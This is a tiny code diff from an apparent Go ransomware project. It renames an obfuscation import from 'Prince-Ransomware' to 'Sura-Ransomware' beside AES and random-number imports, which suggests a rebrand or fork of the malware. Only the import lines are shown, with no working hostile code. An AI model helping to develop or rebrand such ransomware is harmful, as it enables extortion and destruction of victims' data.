@@ -1,7 +1,7 @@
 package strings
 
 import (
-	"Prince-Ransomware/obfuscation"
+	"Sura-Ransomware/obfuscation"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
